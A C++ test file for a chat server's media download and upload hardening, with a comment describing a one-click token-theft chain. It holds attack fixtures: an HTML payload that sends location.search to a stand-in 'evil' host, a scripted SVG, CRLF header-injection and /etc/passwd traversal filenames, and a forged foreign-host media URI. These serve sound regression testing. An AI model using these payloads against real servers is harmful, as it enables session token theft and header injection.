// Media security — the P1 package.
//
// Three separately-defensible decisions used to compose into a one-click
// account takeover (audit A1 / B14):
//
//   1. handle_upload stored the uploader's Content-Type header verbatim.
//   2. handle_download echoed it back with `Content-Disposition: inline` and
//      no nosniff, no CSP, under a blanket `Access-Control-Allow-Origin: *`.
//   3. The client puts the viewer's access token in the media URL's query
//      string, and the file card opens it with Qt.openUrlExternally.
//
// So: upload HTML named Q3-budget.pdf, post it as m.file, and the victim's
// single click opens their system browser at the chat origin with their 90-day
// token in location.search, where the attacker's script reads it.
//
// Separately (audit B3), a media id was a SERVER-WIDE capability: the download
// path checked "is this a live token for some user" and discarded the user id,
// so making a channel private did nothing for anything already posted in it.
//
// Every test below fails on `main`. Grouped as:
//   1. Content-type policy — the allowlist, sniffing, and SVG.
//   2. Content-Disposition — always present, always well-formed.
//   3. Response headers over a real socket.
//   4. Upload normalisation end to end.
//   5. The per-room ACL and the reference index behind it.

#include <gtest/gtest.h>

#include "api/MediaHandler.h"
#include "api/MediaPolicy.h"
#include "auth/LocalAuth.h"
#include "core/Config.h"
#include "storage/LocalStorage.h"
#include "store/SqliteStore.h"

#include <bsfchat/Constants.h>
#include <bsfchat/Identifiers.h>
#include <bsfchat/MatrixTypes.h>
#include <bsfchat/Permissions.h>

#include <httplib.h>
#include <nlohmann/json.hpp>
#include <sqlite3.h>

#include <unistd.h>

#include <atomic>
#include <filesystem>
#include <memory>
#include <regex>
#include <string>
#include <thread>
#include <vector>

using namespace bsfchat;
using json = nlohmann::json;

namespace {

std::filesystem::path unique_dir(const std::string& prefix) {
    static std::atomic<unsigned> counter{0};
    auto path = std::filesystem::temp_directory_path()
              / (prefix + "-" + std::to_string(static_cast<long>(::getpid()))
                 + "-" + std::to_string(counter.fetch_add(1)));
    std::error_code ec;
    std::filesystem::remove_all(path, ec);
    return path;
}

// Minimal valid-enough bodies for each format the allowlist sniffs.
const std::string kPng = std::string("\x89PNG\r\n\x1a\n", 8) + "....IHDR";
const std::string kJpeg = std::string("\xff\xd8\xff\xe0", 4) + "..JFIF..";
const std::string kGif = "GIF89a............";
const std::string kMp4 = std::string("\0\0\0\x20", 4) + "ftypisom" + "............";
const std::string kWebm = std::string("\x1a\x45\xdf\xa3", 4) + "............";
const std::string kPdf = "%PDF-1.7\n............";
const std::string kHtml = "<html><script>fetch('//evil/'+location.search)</script>";
const std::string kSvg = "<svg xmlns='http://www.w3.org/2000/svg'><script>x()</script></svg>";

} // namespace

// ══ 1. Content-type policy ════════════════════════════════════════════════

TEST(MediaContentTypePolicy, HtmlIsNeverStoredAsHtml) {
    // The first link in the chain. Whatever the uploader claims, HTML is not a
    // type this server will ever admit to serving.
    EXPECT_EQ(media_policy::normalise_content_type("text/html", kHtml),
              "application/octet-stream");
    EXPECT_EQ(media_policy::normalise_content_type("text/html; charset=utf-8", kHtml),
              "application/octet-stream");
    EXPECT_EQ(media_policy::normalise_content_type("application/xhtml+xml", kHtml),
              "application/octet-stream");
    EXPECT_FALSE(media_policy::is_inline_safe("text/html"));
}

TEST(MediaContentTypePolicy, SvgIsAnImageThatExecutesAndIsTreatedAsNeither) {
    // The trap in the allowlist. An SVG passes every "is it an image?" test a
    // reviewer applies by eye, and carries <script>.
    EXPECT_EQ(media_policy::normalise_content_type("image/svg+xml", kSvg),
              "application/octet-stream");
    EXPECT_FALSE(media_policy::is_inline_safe("image/svg+xml"));
    // ...and it cannot sneak in under another image type either, because the
    // magic bytes of a PNG are not the magic bytes of an SVG.
    EXPECT_EQ(media_policy::normalise_content_type("image/png", kSvg),
              "application/octet-stream");
}

TEST(MediaContentTypePolicy, AllowlistedTypesSurviveWhenTheBytesAgree) {
    EXPECT_EQ(media_policy::normalise_content_type("image/png", kPng), "image/png");
    EXPECT_EQ(media_policy::normalise_content_type("image/jpeg", kJpeg), "image/jpeg");
    EXPECT_EQ(media_policy::normalise_content_type("image/gif", kGif), "image/gif");
    EXPECT_EQ(media_policy::normalise_content_type("video/mp4", kMp4), "video/mp4");
    EXPECT_EQ(media_policy::normalise_content_type("video/webm", kWebm), "video/webm");
    // Parameters, case and the image/jpg alias all normalise to one spelling.
    EXPECT_EQ(media_policy::normalise_content_type("IMAGE/JPG ; charset=binary", kJpeg),
              "image/jpeg");
}

TEST(MediaContentTypePolicy, BytesThatDisagreeWithTheDeclaredTypeDowngrade) {
    // An attacker declaring an allowlisted type over an HTML body gets
    // octet-stream, not their chosen type — sniffing is used to downgrade.
    EXPECT_EQ(media_policy::normalise_content_type("image/png", kHtml),
              "application/octet-stream");
    EXPECT_EQ(media_policy::normalise_content_type("video/mp4", kHtml),
              "application/octet-stream");
    // An empty header is not a licence either.
    EXPECT_EQ(media_policy::normalise_content_type("", kHtml), "application/octet-stream");
}

TEST(MediaContentTypePolicy, PdfIsStorableButNotInline) {
    // A browser's PDF viewer is a scripting host and no client feature needs an
    // inline PDF, so it keeps its type for the download but never renders.
    EXPECT_EQ(media_policy::normalise_content_type("application/pdf", kPdf), "application/pdf");
    EXPECT_FALSE(media_policy::is_inline_safe("application/pdf"));
    EXPECT_EQ(media_policy::normalise_content_type("application/pdf", kHtml),
              "application/octet-stream");
}

// ══ 2. Content-Disposition ════════════════════════════════════════════════

TEST(MediaDisposition, IsAlwaysPresentEvenWithNoFilename) {
    // The old code emitted the header only when a filename was known, so an
    // upload with no ?filename= got no disposition at all — which every browser
    // reads as inline.
    EXPECT_EQ(media_policy::content_disposition(false, ""), "attachment");
    EXPECT_EQ(media_policy::content_disposition(true, ""), "inline");
}

TEST(MediaDisposition, CrLfInTheFilenameCannotSuppressTheHeader) {
    // httplib 0.47 validates field values and silently DROPS a header whose
    // value contains CR or LF. An unsanitised filename would therefore let an
    // attacker delete their own Content-Disposition — restoring inline
    // rendering — by naming the file with a newline in it.
    auto v = media_policy::content_disposition(false, "a\r\nX-Injected: yes\r\n\r\n<html>");
    EXPECT_EQ(v.find('\r'), std::string::npos);
    EXPECT_EQ(v.find('\n'), std::string::npos);
    EXPECT_EQ(v.rfind("attachment", 0), 0u);
    EXPECT_TRUE(httplib::detail::fields::is_field_value(v))
        << "httplib would drop this header: " << v;
}

TEST(MediaDisposition, QuotesAndPathsCannotEscapeTheQuotedString) {
    auto v = media_policy::content_disposition(false, "a\";x=\"b/../../etc/passwd");
    EXPECT_EQ(std::count(v.begin(), v.end(), '"'), 2)
        << "filename= must be one quoted-string: " << v;
    EXPECT_EQ(v.find('/'), std::string::npos) << v;
}

// ══ 3. Response headers, over a real socket ═══════════════════════════════

namespace {

// A live server with both download routes registered, exactly as
// Server::setup_routes does, so httplib's own header handling is in the loop.
class MediaResponseTest : public ::testing::Test {
protected:
    void SetUp() override {
        dir_ = unique_dir("bsfchat-mediasec");
        std::filesystem::create_directories(dir_);
        storage_ = std::make_shared<LocalStorage>(dir_.string());
        config_ = Config::defaults();
        config_.server_name = "test";
        config_.require_media_auth = true;
        store_ = std::make_unique<SqliteStore>(":memory:");
        store_->initialize();
        store_->create_user("@alice:test", "x");
        store_->store_access_token(token_, "@alice:test", "dev");
        handler_ = std::make_shared<MediaHandler>(*store_, config_, storage_);

        // Mirrors Server::register_routes(), including the blanket CORS header
        // the pre-routing handler sets on every response — media has to undo it
        // itself, so a test that did not set it could not observe the fix.
        svr_.set_pre_routing_handler([](const httplib::Request&, httplib::Response& res) {
            res.set_header("Access-Control-Allow-Origin", "*");
            return httplib::Server::HandlerResponse::Unhandled;
        });
        auto dispatch = [h = handler_](const httplib::Request& rq, httplib::Response& rs) {
            h->handle_download(rq, rs);
        };
        svr_.Get(R"(/_matrix/media/v3/download/([^/]+)/([^/]+)/([^/]+))", dispatch);
        svr_.Get(R"(/_matrix/media/v3/download/([^/]+)/([^/]+))", dispatch);

        port_ = svr_.bind_to_any_port("127.0.0.1");
        ASSERT_GT(port_, 0);
        thread_ = std::thread([this] { svr_.listen_after_bind(); });
        svr_.wait_until_ready();
    }

    void TearDown() override {
        svr_.stop();
        if (thread_.joinable()) thread_.join();
        std::filesystem::remove_all(dir_);
    }

    // Writes a media row DIRECTLY, bypassing handle_upload. That is the point:
    // it models a row written by an older build, a restored backup or a future
    // ingestion path, and proves the download side stands on its own rather
    // than trusting that the upload side already cleaned everything.
    void put(const std::string& id, const std::string& body, const std::string& type,
             const std::string& filename) {
        storage_->upload(id, body, type, filename);
        store_->insert_media(id, "@alice:test", type, filename,
                             static_cast<int64_t>(body.size()), "/x/" + id);
    }

    httplib::Result get(const std::string& path) {
        httplib::Client cli("127.0.0.1", port_);
        cli.set_read_timeout(10);
        return cli.Get(path, {{"Authorization", "Bearer " + token_}});
    }

    std::filesystem::path dir_;
    std::shared_ptr<LocalStorage> storage_;
    std::unique_ptr<SqliteStore> store_;
    std::shared_ptr<MediaHandler> handler_;
    Config config_;
    httplib::Server svr_;
    std::thread thread_;
    int port_ = 0;
    std::string token_ = "media-token";
};

} // namespace

TEST_F(MediaResponseTest, StoredHtmlIsServedAsAnOpaqueAttachment) {
    // The takeover payload, already in the database. Even so, nothing about
    // this response invites a browser to run it.
    put("evil", kHtml, "text/html", "Q3-budget.pdf");

    auto res = get("/_matrix/media/v3/download/test/evil");
    ASSERT_TRUE(res);
    EXPECT_EQ(res->status, 200);
    EXPECT_EQ(res->get_header_value("Content-Type"), "application/octet-stream");
    EXPECT_EQ(res->get_header_value("Content-Disposition"),
              "attachment; filename=\"Q3-budget.pdf\"");
    EXPECT_EQ(res->get_header_value("X-Content-Type-Options"), "nosniff");
}

TEST_F(MediaResponseTest, SecurityHeadersAreOnEveryDownload) {
    put("pic", kPng, "image/png", "p.png");

    auto res = get("/_matrix/media/v3/download/test/pic");
    ASSERT_TRUE(res);
    EXPECT_EQ(res->status, 200);
    EXPECT_EQ(res->get_header_value("X-Content-Type-Options"), "nosniff");
    EXPECT_NE(res->get_header_value("Content-Security-Policy").find("default-src 'none'"),
              std::string::npos);
    EXPECT_NE(res->get_header_value("Content-Security-Policy").find("sandbox"),
              std::string::npos);
    EXPECT_EQ(res->get_header_value("X-Frame-Options"), "DENY");
    EXPECT_EQ(res->get_header_value("Referrer-Policy"), "no-referrer");
    EXPECT_EQ(res->get_header_value("Cross-Origin-Resource-Policy"), "same-origin");
}

TEST_F(MediaResponseTest, TheBlanketCorsHeaderIsRemovedOnMedia) {
    // `Access-Control-Allow-Origin: *` on media invites any page on the
    // internet to read a logged-in user's attachments.
    put("pic", kPng, "image/png", "p.png");

    auto res = get("/_matrix/media/v3/download/test/pic");
    ASSERT_TRUE(res);
    EXPECT_FALSE(res->has_header("Access-Control-Allow-Origin"))
        << "got: " << res->get_header_value("Access-Control-Allow-Origin");
}

TEST_F(MediaResponseTest, ImagesAndVideoStillRenderInline) {
    // The client has to be able to show these in place; a fix that turned every
    // attachment into a download would have broken the product.
    put("pic", kPng, "image/png", "p.png");
    put("clip", kMp4, "video/mp4", "c.mp4");

    auto img = get("/_matrix/media/v3/download/test/pic");
    ASSERT_TRUE(img);
    EXPECT_EQ(img->get_header_value("Content-Type"), "image/png");
    EXPECT_EQ(img->get_header_value("Content-Disposition"), "inline; filename=\"p.png\"");

    auto vid = get("/_matrix/media/v3/download/test/clip");
    ASSERT_TRUE(vid);
    EXPECT_EQ(vid->get_header_value("Content-Type"), "video/mp4");
    EXPECT_EQ(vid->get_header_value("Content-Disposition"), "inline; filename=\"c.mp4\"");
}

TEST_F(MediaResponseTest, AFilenameInTheUrlCannotInjectOrDropAHeader) {
    // The third path segment is attacker-chosen and httplib percent-decodes it
    // before routing, so `%0d%0a` in the URL reaches the handler as a real CRLF.
    put("evil", kHtml, "text/html", "");

    auto res = get("/_matrix/media/v3/download/test/evil/"
                   "a%22%0d%0aX-Injected:%20yes%0d%0a");
    ASSERT_TRUE(res);
    EXPECT_FALSE(res->has_header("X-Injected"));
    // ...and, more importantly, the disposition still exists. A dropped header
    // here is inline rendering, which is the whole exploit.
    EXPECT_NE(res->get_header_value("Content-Disposition").rfind("attachment", 0),
              std::string::npos);
}

// ══ 4. Upload normalisation, end to end ═══════════════════════════════════

TEST_F(MediaResponseTest, UploadRewritesTheContentTypeBeforeItIsEverStored) {
    httplib::Request req;
    req.path = "/_matrix/media/v3/upload";
    req.body = kHtml;
    req.set_header("Authorization", "Bearer " + token_);
    req.set_header("Content-Type", "text/html");
    req.params.emplace("filename", "Q3-budget.pdf");

    httplib::Response res;
    handler_->handle_upload(req, res);
    ASSERT_EQ(res.status, 200) << res.body;

    auto uri = json::parse(res.body)["content_uri"].get<std::string>();
    auto id = uri.substr(uri.rfind('/') + 1);
    auto meta = store_->get_media(id);
    ASSERT_TRUE(meta);
    // Stored, not merely served: nothing downstream ever sees "text/html".
    EXPECT_EQ(meta->content_type, "application/octet-stream");
}

TEST_F(MediaResponseTest, UploadKeepsARealImagesType) {
    httplib::Request req;
    req.path = "/_matrix/media/v3/upload";
    req.body = kPng;
    req.set_header("Authorization", "Bearer " + token_);
    req.set_header("Content-Type", "image/png");

    httplib::Response res;
    handler_->handle_upload(req, res);
    ASSERT_EQ(res.status, 200) << res.body;

    auto uri = json::parse(res.body)["content_uri"].get<std::string>();
    auto meta = store_->get_media(uri.substr(uri.rfind('/') + 1));
    ASSERT_TRUE(meta);
    EXPECT_EQ(meta->content_type, "image/png");
}

// ══ 5. Per-room ACL ═══════════════════════════════════════════════════════

namespace {

ServerRole make_role(const std::string& id, int position, permission::Flags flags) {
    ServerRole r;
    r.id = id;
    r.name = id;
    r.position = position;
    r.permissions = flags;
    return r;
}

// A store with roles, rooms and media, driven through the real handler.
struct AclFixture {
    std::filesystem::path dir;
    Config config;
    std::shared_ptr<LocalStorage> storage;
    std::unique_ptr<SqliteStore> store;
    std::unique_ptr<MediaHandler> handler;

    AclFixture() {
        dir = unique_dir("bsfchat-mediaacl");
        std::filesystem::create_directories(dir);
        storage = std::make_shared<LocalStorage>(dir.string());
        config = Config::defaults();
        config.server_name = "test";
        config.require_media_auth = true;
        store = std::make_unique<SqliteStore>(":memory:");
        store->initialize();

        ServerRolesContent roles;
        roles.roles.push_back(
            make_role(std::string(permission::role_id::kEveryone), 0, permission::kEveryoneDefault));
        json j;
        to_json(j, roles);
        store->set_server_state(std::string(event_type::kServerRoles), "", "@server:test", j.dump());

        handler = std::make_unique<MediaHandler>(*store, config, storage);
    }

    ~AclFixture() { std::filesystem::remove_all(dir); }

    std::string add_user(const std::string& localpart) {
        std::string uid = "@" + localpart + ":test";
        store->create_user(uid, hash_password("password", 10));
        store->store_access_token("token-" + localpart, uid, "dev");
        MemberRolesContent c;
        c.role_ids = {std::string(permission::role_id::kEveryone)};
        json j;
        to_json(j, c);
        store->set_server_state(std::string(event_type::kMemberRoles), uid, "@server:test", j.dump());
        return uid;
    }

    std::string add_channel(const std::string& creator) {
        auto room_id = generate_room_id("test");
        store->create_room(room_id, creator);
        store->set_membership(room_id, creator, std::string(membership::kJoin));
        store->insert_event(generate_event_id("test"), room_id, creator,
                            std::string(event_type::kRoomType), std::string(""),
                            json{{"type", "text"}}.dump(), 1001);
        return room_id;
    }

    void join(const std::string& room_id, const std::string& user_id) {
        store->set_membership(room_id, user_id, std::string(membership::kJoin));
    }

    // Deny VIEW_CHANNEL to one user in one channel — the lockdown the audit
    // describes, and the state in which the old code still served the bytes.
    void deny_view(const std::string& room_id, const std::string& target) {
        ChannelPermissionOverride ov;
        ov.allow = 0;
        ov.deny = permission::kViewChannel;
        json j;
        to_json(j, ov);
        // Overrides are keyed "user:<id>" / "role:<id>", the way
        // PermissionsEngine::compute() looks them up.
        store->insert_event(generate_event_id("test"), room_id, "@server:test",
                            std::string(event_type::kChannelPermissions), "user:" + target,
                            j.dump(), 1003);
    }

    // An uploaded object, owned by `uploader`, attached to nothing yet.
    std::string upload(const std::string& uploader, const std::string& body = kPng) {
        static std::atomic<unsigned> n{0};
        // Hex, like MediaHandler::generate_media_id — the reference index only
        // indexes hex ids.
        char buf[33];
        std::snprintf(buf, sizeof(buf), "%032x", n.fetch_add(1) + 1);
        std::string id(buf);
        storage->upload(id, body, "image/png", "p.png");
        store->insert_media(id, uploader, "image/png", "p.png",
                            static_cast<int64_t>(body.size()), "/x/" + id);
        return id;
    }

    // Post it as an ordinary attachment message.
    std::string post(const std::string& room_id, const std::string& sender,
                     const std::string& mxc_uri) {
        auto event_id = generate_event_id("test");
        store->insert_event(event_id, room_id, sender,
                            std::string(event_type::kRoomMessage), std::nullopt,
                            json{{"msgtype", "m.image"}, {"body", "p.png"},
                                 {"url", mxc_uri},
                                 {"info", {{"thumbnail_url", mxc_uri}}}}.dump(),
                            2000);
        return event_id;
    }

    std::string mxc(const std::string& id) const { return "mxc://test/" + id; }

    int download_status(const std::string& media_id, const std::string& localpart) {
        httplib::Request req;
        req.path = "/_matrix/media/v3/download/test/" + media_id;
        static const std::regex pattern(R"(/_matrix/media/v3/download/([^/]+)/([^/]+))");
        std::regex_match(req.path, req.matches, pattern);
        req.set_header("Authorization", "Bearer token-" + localpart);
        httplib::Response res;
        handler->handle_download(req, res);
        // httplib leaves status at -1 when a handler only installs a content
        // provider, which is what a successful streamed download does.
        return res.status == -1 ? 200 : res.status;
    }
};

} // namespace

TEST(MediaAcl, AMemberOfTheChannelCanDownloadWhatWasPostedInIt) {
    AclFixture f;
    auto alice = f.add_user("alice");
    auto bob = f.add_user("bob");
    auto room = f.add_channel(alice);
    f.join(room, bob);

    auto id = f.upload(alice);
    f.post(room, alice, f.mxc(id));

    EXPECT_EQ(f.download_status(id, "bob"), 200);
}

TEST(MediaAcl, LosingViewChannelRevokesTheAttachmentsToo) {
    // Audit B3's realistic path: the channel is locked down after the fact and
    // Bob replays the id he already has. This returned 200 forever.
    AclFixture f;
    auto alice = f.add_user("alice");
    auto bob = f.add_user("bob");
    auto room = f.add_channel(alice);
    f.join(room, bob);

    auto id = f.upload(alice);
    f.post(room, alice, f.mxc(id));
    ASSERT_EQ(f.download_status(id, "bob"), 200) << "precondition: Bob could see it";

    f.deny_view(room, bob);

    // 404 rather than 403, matching the "no such media" answer byte for byte so
    // an id cannot be probed for existence.
    EXPECT_EQ(f.download_status(id, "bob"), 404);
}

TEST(MediaAcl, AStrangerCannotFetchAPrivateChannelsMediaByIdAlone) {
    AclFixture f;
    auto alice = f.add_user("alice");
    auto mallory = f.add_user("mallory");
    auto room = f.add_channel(alice);
    f.deny_view(room, mallory);

    auto id = f.upload(alice);
    f.post(room, alice, f.mxc(id));

    EXPECT_EQ(f.download_status(id, "mallory"), 404);
    EXPECT_EQ(f.download_status(id, "alice"), 200);
}

TEST(MediaAcl, UnattachedMediaIsVisibleOnlyToItsUploader) {
    // "No room recorded" must mean nobody, not everybody — otherwise the gap
    // between upload and send, and every future ingestion path, is the bypass.
    // The uploader keeps access so a client can still preview what it just
    // uploaded before it sends the message.
    AclFixture f;
    auto alice = f.add_user("alice");
    auto bob = f.add_user("bob");

    auto id = f.upload(alice);

    EXPECT_EQ(f.download_status(id, "alice"), 200);
    EXPECT_EQ(f.download_status(id, "bob"), 404);
}

TEST(MediaAcl, AProfileAvatarIsReadableByAnyAuthenticatedUser) {
    // The one legitimately room-less class: an avatar is drawn next to its
    // owner's name in every channel, and /profile already discloses the URI.
    AclFixture f;
    auto alice = f.add_user("alice");
    auto bob = f.add_user("bob");

    auto id = f.upload(alice);
    ASSERT_EQ(f.download_status(id, "bob"), 404) << "precondition: not yet an avatar";

    f.store->set_avatar_url(alice, f.mxc(id));
    EXPECT_EQ(f.download_status(id, "bob"), 200);
}

TEST(MediaAcl, PostingAForeignHostUriCannotBindSomeoneElsesMediaId) {
    // If the index keyed on the bare media id, Mallory could paste
    // `mxc://anything/<id>` into a channel she controls and grant herself the
    // object. The index holds whole URIs and the download path looks up the one
    // built from its own server_name, so a foreign host never matches.
    AclFixture f;
    auto alice = f.add_user("alice");
    auto mallory = f.add_user("mallory");
    auto secret = f.add_channel(alice);
    f.deny_view(secret, mallory);
    auto mine = f.add_channel(mallory);

    auto id = f.upload(alice);
    f.post(secret, alice, f.mxc(id));

    f.post(mine, mallory, "mxc://evil.example/" + id);
    EXPECT_EQ(f.download_status(id, "mallory"), 404);

    // And the same trick with the right host but a non-hex id is not indexed
    // at all, so it cannot widen anything either.
    f.post(mine, mallory, "mxc://test/../" + id);
    EXPECT_EQ(f.download_status(id, "mallory"), 404);
}

TEST(MediaAcl, ANonMemberIsRefusedEvenThoughEveryoneHasViewChannelByDefault) {
    // VIEW_CHANNEL alone is not the gate. A DM carries no channel overrides, so
    // @everyone's default VIEW_CHANNEL evaluates TRUE for a user who has never
    // been near it — checking only the permission would have made every DM
    // attachment on the server readable by any account. can_read_room() pairs
    // membership with VIEW_CHANNEL for exactly this reason; so does this.
    AclFixture f;
    auto alice = f.add_user("alice");
    auto bob = f.add_user("bob");
    auto mallory = f.add_user("mallory");

    auto dm = generate_room_id("test");
    f.store->create_room(dm, alice, /*is_direct=*/true);
    f.store->set_membership(dm, alice, std::string(membership::kJoin));
    f.store->set_membership(dm, bob, std::string(membership::kJoin));

    auto id = f.upload(alice);
    f.post(dm, alice, f.mxc(id));

    EXPECT_EQ(f.download_status(id, "bob"), 200);
    EXPECT_EQ(f.download_status(id, "mallory"), 404);
}

TEST(MediaAcl, RedactingTheMessageRevokesTheGrantItCarried) {
    AclFixture f;
    auto alice = f.add_user("alice");
    auto bob = f.add_user("bob");
    auto room = f.add_channel(alice);
    f.join(room, bob);

    auto id = f.upload(alice);
    auto event_id = f.post(room, alice, f.mxc(id));
    ASSERT_EQ(f.download_status(id, "bob"), 200);

    f.store->redact_event(event_id, alice);

    EXPECT_TRUE(f.store->get_media_rooms(f.mxc(id)).empty());
    EXPECT_EQ(f.download_status(id, "bob"), 404);
    // The uploader still has it: the blob is not deleted by a redaction, and
    // pretending otherwise would be a claim this package does not make.
    EXPECT_EQ(f.download_status(id, "alice"), 200);
}

TEST(MediaAcl, DeletingTheRoomRevokesItsMediaGrants) {
    AclFixture f;
    auto alice = f.add_user("alice");
    auto bob = f.add_user("bob");
    auto room = f.add_channel(alice);
    f.join(room, bob);

    auto id = f.upload(alice);
    f.post(room, alice, f.mxc(id));
    ASSERT_EQ(f.download_status(id, "bob"), 200);

    f.store->delete_room(room);

    EXPECT_TRUE(f.store->get_media_rooms(f.mxc(id)).empty());
    EXPECT_EQ(f.download_status(id, "bob"), 404);
}

TEST(MediaAcl, TheReferenceIndexFollowsTheUriWhereverItAppears) {
    // The index is a walk of the whole content document, not a list of known
    // keys, so a URI in a thumbnail, inside an edit's m.new_content, or in a
    // shape nobody anticipated still binds to the room it was posted in.
    AclFixture f;
    auto alice = f.add_user("alice");
    auto bob = f.add_user("bob");
    auto room = f.add_channel(alice);
    f.join(room, bob);

    auto thumb = f.upload(alice);
    auto nested = f.upload(alice);

    f.store->insert_event(
        generate_event_id("test"), room, alice, std::string(event_type::kRoomMessage),
        std::nullopt,
        json{{"msgtype", "m.image"},
             {"body", "x"},
             {"info", {{"thumbnail_url", f.mxc(thumb)}}},
             {"m.new_content", {{"attachments", json::array({{{"src", f.mxc(nested)}}})}}}}
            .dump(),
        2001);

    EXPECT_EQ(f.store->get_media_rooms(f.mxc(thumb)), std::vector<std::string>{room});
    EXPECT_EQ(f.store->get_media_rooms(f.mxc(nested)), std::vector<std::string>{room});
    EXPECT_EQ(f.download_status(thumb, "bob"), 200);
    EXPECT_EQ(f.download_status(nested, "bob"), 200);
}

// ══ 6. The v19 backfill ═══════════════════════════════════════════════════

TEST(MediaAclMigration, ExistingEventsAreBackfilledIntoTheReferenceIndex) {
    // The half that decides whether this ships or breaks a live deployment.
    // The download path reads "no room recorded" as "nobody", so if v19 landed
    // without a backfill every attachment already on disk would 404 for
    // everyone but its uploader the moment the server restarted.
    //
    // Simulated by building the corpus, emptying the index, and winding
    // user_version back — so the assertions are against the migration's own
    // SQL (a json_tree() walk) rather than against insert_event's C++ walk.
    auto path = (std::filesystem::temp_directory_path()
                 / ("bsfchat-mediasec-v19-" + std::to_string(::getpid()) + ".db")).string();
    for (auto suffix : {"", "-wal", "-shm"}) std::filesystem::remove(path + suffix);

    auto raw = [&](const std::string& sql) {
        sqlite3* db = nullptr;
        ASSERT_EQ(sqlite3_open(path.c_str(), &db), SQLITE_OK);
        ASSERT_EQ(sqlite3_exec(db, sql.c_str(), nullptr, nullptr, nullptr), SQLITE_OK);
        sqlite3_close(db);
    };

    const std::string room = "!legacy:test";
    const std::string mxc = "mxc://test/00000000000000000000000000abcdef";
    const std::string thumb = "mxc://test/00000000000000000000000000fedcba";

    {
        SqliteStore store(path);
        store.initialize();
        store.create_user("@alice:test", hash_password("p", 10));
        store.create_room(room, "@alice:test");
        store.insert_event("$pic", room, "@alice:test", std::string(event_type::kRoomMessage),
                           std::nullopt,
                           json{{"msgtype", "m.image"}, {"body", "p.png"}, {"url", mxc},
                                {"info", {{"thumbnail_url", thumb}}}}.dump(),
                           1000);
        // Redacted history must not be revived into a grant by the backfill.
        store.insert_event("$gone", room, "@alice:test", std::string(event_type::kRoomMessage),
                           std::nullopt,
                           json{{"msgtype", "m.image"},
                                {"url", "mxc://test/000000000000000000000000000000ff"}}.dump(),
                           1001);
        store.redact_event("$gone", "@alice:test");
        // A row whose content is not JSON at all. json_tree() raises on one, so
        // without the migration's CASE WHEN json_valid() guard the entire
        // upgrade would abort and the server would refuse to start. Inserted
        // raw because insert_event would never produce it — a hand-repaired
        // row, or an older build, could.
        raw("INSERT INTO events (event_id, room_id, sender, event_type, content, "
            "origin_server_ts, stream_position) VALUES "
            "('$junk', '!legacy:test', '@alice:test', 'm.room.message', 'not json', 1002, 9999)");
    }

    // Wind back to v18 with an empty index, the state an upgrading deployment
    // is in.
    raw("DELETE FROM media_refs");
    raw("PRAGMA user_version = 18");

    {
        SqliteStore store(path);
        store.initialize();  // runs migrate_v19

        EXPECT_EQ(store.get_media_rooms(mxc), std::vector<std::string>{room});
        EXPECT_EQ(store.get_media_rooms(thumb), std::vector<std::string>{room});
        EXPECT_TRUE(store.get_media_rooms("mxc://test/000000000000000000000000000000ff").empty())
            << "a redacted event must not be backfilled into a grant";
    }

    for (auto suffix : {"", "-wal", "-shm"}) std::filesystem::remove(path + suffix);
}
